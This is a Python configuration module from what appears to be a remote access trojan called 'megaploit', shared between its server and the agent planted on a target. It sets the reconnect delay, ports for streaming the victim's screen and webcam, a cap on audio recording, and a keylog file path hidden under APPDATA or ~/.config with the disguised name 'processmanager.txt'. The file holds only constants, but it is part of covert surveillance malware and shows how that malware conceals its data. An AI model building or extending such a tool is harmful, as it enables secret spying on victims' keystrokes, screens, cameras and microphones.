"""
megaploit.core.config
~~~~~~~~~~~~~~~~~~~~~
Shared constants used by both the server and agent.
"""

# TCP transport
BUFFER_SIZE: int = 4096
AUTH_TIMEOUT: int = 30      # seconds — timeout while authenticating
RECONNECT_DELAY: int = 10   # seconds — agent waits before re-connecting

# Stream framing
END_SENTINEL: bytes = b"<<MEGAPLOIT_END>>"

# Streaming server ports (on the agent machine)
SCREEN_STREAM_PORT: int = 5000
WEBCAM_STREAM_PORT: int = 5001

# Audio recording cap
MAX_RECORD_SECONDS: int = 300

# File paths (agent)
import os as _os
import sys as _sys

if _sys.platform == "win32":
    KEYLOG_PATH: str = _os.path.join(_os.environ.get("APPDATA", "."), "processmanager.txt")
else:
    KEYLOG_PATH: str = _os.path.join(_os.environ.get("HOME", "."), ".config", "processmanager.txt")
